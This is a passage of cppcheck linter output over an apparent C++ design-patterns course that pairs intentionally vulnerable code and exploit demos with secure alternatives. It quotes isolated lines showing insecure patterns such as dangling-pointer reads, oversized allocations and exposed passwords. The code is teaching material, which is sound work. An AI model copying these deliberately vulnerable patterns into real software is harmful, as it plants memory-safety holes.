D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:266:11: style: Variable 'obj2' can be declared as pointer to const [constVariablePointer]
    void* obj2 = factory.createObjectArray(1000000, 1000);
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:278:11: style: Variable 'obj' can be declared as pointer to const [constVariablePointer]
    void* obj = factory.createObject(1024);
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:286:11: style: Variable 'danglingObj' can be declared as pointer to const [constVariablePointer]
    void* danglingObj = factory.getObject(0);
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:245:15: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
        void* obj1 = factory.createObject(100, "small");
              ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:249:15: style: Variable 'obj2' is assigned a value that is never used. [unreadVariable]
        void* obj2 = factory.createObject(2000000, "large");
              ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:262:16: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
    void* obj1 = factory.createObjectArray(10, 100);
               ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:266:16: style: Variable 'obj2' is assigned a value that is never used. [unreadVariable]
    void* obj2 = factory.createObjectArray(1000000, 1000);
               ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:262:11: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
    void* obj1 = factory.createObjectArray(10, 100);
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:266:11: style: Variable 'obj2' is assigned a value that is never used. [unreadVariable]
    void* obj2 = factory.createObjectArray(1000000, 1000);
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:278:15: style: Variable 'obj' is assigned a value that is never used. [unreadVariable]
    void* obj = factory.createObject(1024);
              ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\abstract_factory_vulnerabilities.cpp:278:11: style: Variable 'obj' is assigned a value that is never used. [unreadVariable]
    void* obj = factory.createObject(1024);
          ^
56/194 files checked 33% done
Checking D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp ...
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:147:12: style: inconclusive: Same expression used in consecutive assignments of 'largeCount' and 'largeSize'. [duplicateAssignExpression]
    size_t largeCount = SIZE_MAX / 2;
           ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:148:12: note: Same expression used in consecutive assignments of 'largeCount' and 'largeSize'.
    size_t largeSize = SIZE_MAX / 2;
           ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:147:12: note: Same expression used in consecutive assignments of 'largeCount' and 'largeSize'.
    size_t largeCount = SIZE_MAX / 2;
           ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:143:11: style: Variable 'obj1' can be declared as pointer to const [constVariablePointer]
    void* obj1 = factory.createObjectArray(10, 100);
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:152:11: style: Variable 'obj2' can be declared as pointer to const [constVariablePointer]
    void* obj2 = factory.createObjectArray(largeCount, largeSize);
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:225:11: style: Variable 'obj' can be declared as pointer to const [constVariablePointer]
    void* obj = factory.createObject(1024);
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:239:15: style: Variable 'data' can be declared as pointer to const [constVariablePointer]
        char* data = static_cast<char*>(danglingObj);
              ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:143:16: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
    void* obj1 = factory.createObjectArray(10, 100);
               ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:143:11: style: Variable 'obj1' is assigned a value that is never used. [unreadVariable]
    void* obj1 = factory.createObjectArray(10, 100);
          ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:225:15: style: Variable 'obj' is assigned a value that is never used. [unreadVariable]
    void* obj = factory.createObject(1024);
              ^
D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\exploits\abstract_factory_exploits.cpp:225:11: style: Variable 'obj' is assigned a value that is never used. [unreadVariable]
    void* obj = factory.createObject(1024);
          ^
57/194 files checked 33% done
Checking D:\Work\Patterns\03-creational\lesson_3_3_abstract_factory\secure_abstract_factory_alternatives.cpp ...
58/194 files checked 33% done
Checking D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_cpp23_comparison.cpp ...
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_cpp23_comparison.cpp:74:13: style: inconclusive: Technically the member function 'cpp17::Builder::build' can be const. [functionConst]
    Product build() {
            ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_cpp23_comparison.cpp:124:35: style: inconclusive: Technically the member function 'cpp23::Builder::build' can be const. [functionConst]
    expected<Product, BuildError> build() {
                                  ^
59/194 files checked 34% done
Checking D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp ...
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:34:1: style: The class 'VulnerableMessageBuilder' does not declare a constructor although it has private member variables which likely require initialization. [noConstructor]
class VulnerableMessageBuilder {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:55:13: style: inconclusive: Technically the member function 'VulnerableMessageBuilder::build' can be const. [functionConst]
    Message build() {
            ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:114:15: style: inconclusive: Technically the member function 'VulnerableDataBlockBuilder::build' can be const. [functionConst]
    DataBlock build() {
              ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:204:17: style: inconclusive: Technically the member function 'VulnerableUserBuilder::build' can be const. [functionConst]
    UserAccount build() {
                ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:361:13: style: inconclusive: Technically the member function 'VulnerableRequestBuilder::build' can be const. [functionConst]
    Request build() {
            ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:448:11: style: inconclusive: Technically the member function 'VulnerableQueryBuilder::build' can be const. [functionConst]
    Query build() {
          ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:263:9: warning: Class 'VulnerableDatabaseBuilder' does not have a copy constructor which is recommended since it has dynamic memory/resource allocation(s). [noCopyConstructor]
        db_ = new Database();
        ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:263:9: warning: Class 'VulnerableDatabaseBuilder' does not have a operator= which is recommended since it has dynamic memory/resource allocation(s). [noOperatorEq]
        db_ = new Database();
        ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:55:13: performance: Function 'build()' should return member 'msg_' by const reference. [returnByReference]
    Message build() {
            ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:361:13: performance: Function 'build()' should return member 'request_' by const reference. [returnByReference]
    Request build() {
            ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\builder_vulnerabilities.cpp:448:11: performance: Function 'build()' should return member 'query_' by const reference. [returnByReference]
    Query build() {
          ^
60/194 files checked 34% done
Checking D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp ...
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:23:5: warning: Member variable 'VulnerablePacket::header' is not initialized in the constructor. [uninitMemberVar]
    VulnerablePacket() : callback(nullptr) {}
    ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:23:5: warning: Member variable 'VulnerablePacket::data' is not initialized in the constructor. [uninitMemberVar]
    VulnerablePacket() : callback(nullptr) {}
    ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:100:1: style: The class 'AllocatorBuilder' does not declare a constructor although it has private member variables which likely require initialization. [noConstructor]
class AllocatorBuilder {
^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:46:22: style: inconclusive: Technically the member function 'VulnerablePacketBuilder::build' can be const. [functionConst]
    VulnerablePacket build() { return packet_; }
                     ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:205:13: style: inconclusive: Technically the member function 'BypassableAccountBuilder::build' can be const. [functionConst]
    Account build() {
            ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:265:17: style: inconclusive: Technically the member function 'StatefulRequestBuilder::build' can be const. [functionConst]
    HttpRequest build() {
                ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:337:14: style: inconclusive: Technically the member function 'UnsafeQueryBuilder::build' can be const. [functionConst]
    SqlQuery build() {
             ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:46:22: performance: Function 'build()' should return member 'packet_' by const reference. [returnByReference]
    VulnerablePacket build() { return packet_; }
                     ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:265:17: performance: Function 'build()' should return member 'request_' by const reference. [returnByReference]
    HttpRequest build() {
                ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\exploits\builder_exploits.cpp:337:14: performance: Function 'build()' should return member 'query_' by const reference. [returnByReference]
    SqlQuery build() {
             ^
61/194 files checked 35% done
Checking D:\Work\Patterns\03-creational\lesson_3_4_builder\secure_builder_alternatives.cpp ...
D:\Work\Patterns\03-creational\lesson_3_4_builder\secure_builder_alternatives.cpp:71:17: style: inconclusive: Technically the member function 'SafeMessageBuilder::build' can be const. [functionConst]
    SafeMessage build() {
                ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\secure_builder_alternatives.cpp:130:19: style: inconclusive: Technically the member function 'SafeDataBlockBuilder::build' can be const. [functionConst]
    SafeDataBlock build() {
                  ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\secure_builder_alternatives.cpp:233:19: style: inconclusive: Technically the member function 'ValidatedUserBuilder::build' can be const. [functionConst]
    ValidatedUser build() {
                  ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\secure_builder_alternatives.cpp:283:10: style: inconclusive: Technically the member function 'SecureDatabase::connect' can be const. [functionConst]
    void connect() {
         ^
D:\Work\Patterns\03-creational\lesson_3_4_builder\secure_builder_alternatives.cpp:315:20: style: inconclusive: Technically the member function 'SecureDatabaseBuilder::build' can be const. [functionConst]
    SecureDatabase build() {
                   ^
62/194 files checked 35% done
Checking D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_cpp23_comparison.cpp ...
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_cpp23_comparison.cpp:18:32: performance: inconclusive: Technically the member function 'LegacyAPI::legacyMethod' can be static (but you may consider moving to unnamed namespace). [functionStatic]
class LegacyAPI { public: void legacyMethod(int x) { std::cout << "Legacy: " << x << "\n"; } };
                               ^
63/194 files checked 35% done
Checking D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp ...
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:167:9: performance: Variable 'config_' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        config_ = config;
        ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:35:10: performance: inconclusive: Technically the member function 'Adaptee::specificRequest' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void specificRequest() {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:39:10: performance: inconclusive: Technically the member function 'Adaptee::anotherSpecificMethod' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void anotherSpecificMethod(const std::string& data) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:85:10: performance: inconclusive: Technically the member function 'MySQLDriver::openConnection' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void openConnection() {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:89:10: performance: inconclusive: Technically the member function 'MySQLDriver::runQuery' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void runQuery(const std::string& sql) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:93:10: performance: inconclusive: Technically the member function 'MySQLDriver::closeConnection' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void closeConnection() {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:97:10: performance: inconclusive: Technically the member function 'MySQLDriver::setConnectionString' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void setConnectionString(const std::string& connectionString) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:134:10: performance: inconclusive: Technically the member function 'PostgreSQLDriver::establishConnection' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void establishConnection() {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:138:10: performance: inconclusive: Technically the member function 'PostgreSQLDriver::executeSQL' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void executeSQL(const std::string& sql) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:142:10: performance: inconclusive: Technically the member function 'PostgreSQLDriver::terminateConnection' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void terminateConnection() {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:146:10: performance: inconclusive: Technically the member function 'PostgreSQLDriver::configureConnection' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void configureConnection(const std::map<std::string, std::string>& config) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:237:10: performance: inconclusive: Technically the member function 'LegacyDataProcessor::processData' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void processData(const OldDataFormat& data) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:269:19: performance: inconclusive: Technically the member function 'DataFormatAdapter::convertToOldFormat' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    OldDataFormat convertToOldFormat(const NewDataFormat& newData) {
                  ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:336:10: performance: inconclusive: Technically the member function 'LegacyClass::originalMethod' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void originalMethod(int value) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:340:10: performance: inconclusive: Technically the member function 'LegacyClass::originalMethod' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void originalMethod(const std::string& data) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:325:10: performance: inconclusive: Technically the member function 'TemplateAdapter < LegacyClass >::convertData' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    auto convertData(const T& data) -> decltype(adaptee_.originalMethod(data)) {
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:169:31: performance: Searching before insertion is not necessary. Instead of 'config_["host"]="localhost"' consider using 'config_.try_emplace("host", "localhost");'. [stlFindInsert]
            config_["host"] = "localhost";
                              ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_pattern.cpp:172:31: performance: Searching before insertion is not necessary. Instead of 'config_["port"]="5432"' consider using 'config_.try_emplace("port", "5432");'. [stlFindInsert]
            config_["port"] = "5432";
                              ^
64/194 files checked 36% done
Checking D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp ...
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:228:11: style: Variable 'charObj' can be declared as pointer to const [constVariablePointer]
    char* charObj = adapter.getAdapted<char>();
          ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\adapter_vulnerabilities.cpp:275:11: style: Variable 'danglingObj' can be declared as pointer to const [constVariablePointer]
    void* danglingObj = adapter.getObject();
          ^
65/194 files checked 37% done
Checking D:\Work\Patterns\04-structural\lesson_4_1_adapter\exploits\adapter_exploits.cpp ...
D:\Work\Patterns\04-structural\lesson_4_1_adapter\exploits\adapter_exploits.cpp:157:11: style: Variable 'buffer' can be declared as pointer to const [constVariablePointer]
    char* buffer = adapter.getBuffer();
          ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\exploits\adapter_exploits.cpp:239:15: style: Variable 'data' can be declared as pointer to const [constVariablePointer]
        char* data = static_cast<char*>(danglingObj);
              ^
66/194 files checked 37% done
Checking D:\Work\Patterns\04-structural\lesson_4_1_adapter\modern_adapter.cpp ...
D:\Work\Patterns\04-structural\lesson_4_1_adapter\modern_adapter.cpp:143:17: performance: inconclusive: Technically the member function 'LegacyProcessor::process' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::string process(const std::string& request) {
                ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\modern_adapter.cpp:332:10: performance: inconclusive: Technically the member function 'NoCache::cache' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void cache(const std::string& key, const std::string& value) {}
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\modern_adapter.cpp:333:32: performance: inconclusive: Technically the member function 'NoCache::get' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::optional<std::string> get(const std::string& key) { return std::nullopt; }
                               ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\modern_adapter.cpp:334:10: performance: inconclusive: Technically the member function 'NoCache::clear' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void clear() {}
         ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\modern_adapter.cpp:302:17: performance: Function 'getResult()' should return member 'result_' by const reference. [returnByReference]
    std::string getResult() const {
                ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\modern_adapter.cpp:319:17: performance: Function 'getResult()' should return member 'result_' by const reference. [returnByReference]
    std::string getResult() const {
                ^
D:\Work\Patterns\04-structural\lesson_4_1_adapter\modern_adapter.cpp:227:27: style: Consider using std::transform algorithm instead of a raw loop. [useStlAlgorithm]
            convertedData.push_back(static_cast<int>(c));
                          ^
67/194 files checked 38% done
Checking D:\Work\Patterns\04-structural\lesson_4_1_adapter\secure_adapter_alternatives.cpp ...
D:\Work\Patterns\04-structural\lesson_4_1_adapter\secure_adapter_alternatives.cpp:122:5: style: Class 'SecureAdapterV3' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SecureAdapterV3(size_t maxSize = 1024 * 1024) : maxSize(maxSize) {
    ^
68/194 files checked 38% done
Checking D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_cpp23_comparison.cpp ...
D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_cpp23_comparison.cpp:24:5: style: Class 'Decorator' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    Decorator(std::unique_ptr<Component> c) : component_(std::move(c)) {}
    ^
69/194 files checked 39% done
Checking D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_vulnerabilities.cpp ...
D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_vulnerabilities.cpp:50:10: style: inconclusive: Technically the member function 'VulnerableDecorator::process' can be const. [functionConst]
    void process() {
         ^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_vulnerabilities.cpp:161:10: style: inconclusive: Technically the member function 'UseAfterFreeDecorator::process' can be const. [functionConst]
    void process() {
         ^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_vulnerabilities.cpp:209:10: style: inconclusive: Technically the member function 'IntegerOverflowDecorator::process' can be const. [functionConst]
    void process() {
         ^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_vulnerabilities.cpp:135:9: warning: Possible leak in public function. The pointer 'data' is not deallocated before it is allocated. [publicAllocationError]
        data = new char[strlen(str) + 1];
        ^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\decorator_vulnerabilities.cpp:300:11: style: Variable 'data' can be declared as pointer to const [constVariablePointer]
    char* data = root->getData();
          ^
70/194 files checked 39% done
Checking D:\Work\Patterns\04-structural\lesson_4_2_decorator\exploits\decorator_exploits.cpp ...
D:\Work\Patterns\04-structural\lesson_4_2_decorator\exploits\decorator_exploits.cpp:51:10: style: inconclusive: Technically the member function 'VulnerableDecorator::process' can be const. [functionConst]
    void process() {
         ^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\exploits\decorator_exploits.cpp:218:10: style: inconclusive: Technically the member function 'UseAfterFreeDecorator::process' can be const. [functionConst]
    void process() {
         ^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\exploits\decorator_exploits.cpp:192:9: warning: Possible leak in public function. The pointer 'data' is not deallocated before it is allocated. [publicAllocationError]
        data = new char[strlen(str) + 1];
        ^
D:\Work\Patterns\04-structural\lesson_4_2_decorator\exploits\decorator_exploits.cpp:251:11: style: Variable 'data' can be declared as pointer to const [constVariablePointer]
    char* data = root->getData();
          ^
71/194 files checked 40% done
Checking D:\Work\Patterns\04-structural\lesson_4_2_decorator\secure_decorator_alternatives.cpp ...
D:\Work\Patterns\04-structural\lesson_4_2_decorator\secure_decorator_alternatives.cpp:166:5: style: Class 'SecureDecoratorV3' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SecureDecoratorV3(size_t maxDataSize = 1024 * 1024) : maxDataSize(maxDataSize) {
    ^
72/194 files checked 40% done
Checking D:\Work\Patterns\04-structural\lesson_4_3_facade\exploits\facade_exploits.cpp ...
D:\Work\Patterns\04-structural\lesson_4_3_facade\exploits\facade_exploits.cpp:38:9: warning: Possible leak in public function. The pointer 'subsystem1' is not deallocated before it is allocated. [publicAllocationError]
        subsystem1 = new char[1024];
        ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\exploits\facade_exploits.cpp:216:9: warning: Possible leak in public function. The pointer 'subsystem1' is not deallocated before it is allocated. [publicAllocationError]
        subsystem1 = new char[1024];
        ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\exploits\facade_exploits.cpp:114:15: style: Variable 'data' can be declared as pointer to const [constVariablePointer]
        char* data = static_cast<char*>(subsystem1);
              ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\exploits\facade_exploits.cpp:188:11: style: Variable 'buffer' can be declared as pointer to const [constVariablePointer]
    char* buffer = facade.getRequestBuffer();
          ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\exploits\facade_exploits.cpp:266:11: style: Variable 'subsystem1' can be declared as pointer to const [constVariablePointer]
    void* subsystem1 = facade.getSubsystem1();
          ^
73/194 files checked 41% done
Checking D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_cpp23_comparison.cpp ...
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_cpp23_comparison.cpp:18:33: performance: inconclusive: Technically the member function 'SubsystemA::operationA' can be static (but you may consider moving to unnamed namespace). [functionStatic]
class SubsystemA { public: void operationA() { std::cout << "Op A\n"; } };
                                ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_cpp23_comparison.cpp:19:33: performance: inconclusive: Technically the member function 'SubsystemB::operationB' can be static (but you may consider moving to unnamed namespace). [functionStatic]
class SubsystemB { public: void operationB() { std::cout << "Op B\n"; } };
                                ^
74/194 files checked 41% done
Checking D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp ...
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp:37:9: warning: Possible leak in public function. The pointer 'subsystem1' is not deallocated before it is allocated. [publicAllocationError]
        subsystem1 = new char[1024];
        ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp:150:9: warning: Possible leak in public function. The pointer 'subsystem1' is not deallocated before it is allocated. [publicAllocationError]
        subsystem1 = new char[1024];
        ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp:247:11: style: Variable 'sensitiveData' can be declared as pointer to const [constVariablePointer]
    char* sensitiveData = facade.getSensitiveData();
          ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp:253:11: style: Variable 'subsystem1' can be declared as pointer to const [constVariablePointer]
    void* subsystem1 = facade.getSubsystem1();
          ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp:254:11: style: Variable 'subsystem2' can be declared as pointer to const [constVariablePointer]
    void* subsystem2 = facade.getSubsystem2();
          ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp:255:11: style: Variable 'subsystem3' can be declared as pointer to const [constVariablePointer]
    void* subsystem3 = facade.getSubsystem3();
          ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\facade_vulnerabilities.cpp:291:11: style: Variable 'subsystem1' can be declared as pointer to const [constVariablePointer]
    void* subsystem1 = facade.getSubsystem1();
          ^
75/194 files checked 42% done
Checking D:\Work\Patterns\04-structural\lesson_4_3_facade\secure_facade_alternatives.cpp ...
D:\Work\Patterns\04-structural\lesson_4_3_facade\secure_facade_alternatives.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
D:\Work\Patterns\04-structural\lesson_4_3_facade\secure_facade_alternatives.cpp:55:17: performance: inconclusive: Technically the member function 'SecureFacadeV1::encryptData' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::string encryptData(const std::string& data) {
                ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\secure_facade_alternatives.cpp:64:17: performance: inconclusive: Technically the member function 'SecureFacadeV1::decryptData' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::string decryptData(const std::string& encrypted) const {
                ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\secure_facade_alternatives.cpp:198:5: style: Class 'SecureFacadeV3' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SecureFacadeV3(size_t maxRequestSize = 1024) : maxRequestSize(maxRequestSize) {
    ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\secure_facade_alternatives.cpp:58:15: style: Consider using std::transform algorithm instead of a raw loop. [useStlAlgorithm]
            c = c ^ 0xAA; // ????'? XOR ?"????
              ^
D:\Work\Patterns\04-structural\lesson_4_3_facade\secure_facade_alternatives.cpp:67:15: style: Consider using std::transform algorithm instead of a raw loop. [useStlAlgorithm]
            c = c ^ 0xAA; // ????'? XOR ???"???
              ^
76/194 files checked 42% done
Checking D:\Work\Patterns\04-structural\lesson_4_4_proxy\exploits\proxy_exploits.cpp ...
D:\Work\Patterns\04-structural\lesson_4_4_proxy\exploits\proxy_exploits.cpp:114:15: style: Variable 'data' can be declared as pointer to const [constVariablePointer]
        char* data = static_cast<char*>(realObj);
              ^
D:\Work\Patterns\04-structural\lesson_4_4_proxy\exploits\proxy_exploits.cpp:190:11: style: Variable 'buffer' can be declared as pointer to const [constVariablePointer]
    char* buffer = proxy.getRequestBuffer();
          ^
D:\Work\Patterns\04-structural\lesson_4_4_proxy\exploits\proxy_exploits.cpp:268:11: style: Variable 'realObj' can be declared as pointer to const [constVariablePointer]
    void* realObj = proxy.getRealObject();
          ^
77/194 files checked 43% done
Checking D:\Work\Patterns\04-structural\lesson_4_4_proxy\proxy_cpp23_comparison.cpp ...
78/194 files checked 43% done
Checking D:\Work\Patterns\04-structural\lesson_4_4_proxy\proxy_vulnerabilities.cpp ...
D:\Work\Patterns\04-structural\lesson_4_4_proxy\proxy_vulnerabilities.cpp:243:11: style: Variable 'username' can be declared as pointer to const [constVariablePointer]
    char* username = proxy.getUsername();
          ^
D:\Work\Patterns\04-structural\lesson_4_4_proxy\proxy_vulnerabilities.cpp:244:11: style: Variable 'password' can be declared as pointer to const [constVariablePointer]
    char* password = proxy.getPassword();
          ^
D:\Work\Patterns\04-structural\lesson_4_4_proxy\proxy_vulnerabilities.cpp:254:11: style: Variable 'realObj' can be declared as pointer to const [constVariablePointer]
    void* realObj = proxy.getRealObject();
          ^
D:\Work\Patterns\04-structural\lesson_4_4_proxy\proxy_vulnerabilities.cpp:296:11: style: Variable 'realObj' can be declared as pointer to const [constVariablePointer]
    void* realObj = proxy.getRealObject();
          ^
79/194 files checked 44% done
Checking D:\Work\Patterns\04-structural\lesson_4_4_proxy\secure_proxy_alternatives.cpp ...
D:\Work\Patterns\04-structural\lesson_4_4_proxy\secure_proxy_alternatives.cpp:150:5: style: Class 'SecureProxyV3' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    SecureProxyV3(size_t maxRequestSize = 1024) : maxRequestSize(maxRequestSize) {
    ^
80/194 files checked 44% done
Checking D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp ...
D:\Work\Patterns\05-behavioral\lesson_5_1_observer\exploits\observer_exploits.cpp:186:27: style: inconclusive: Member variable 'ActionObserver::action_' is in the wrong place in the initializer list. [initializerList]
    std::function<void()> action_;
                          ^
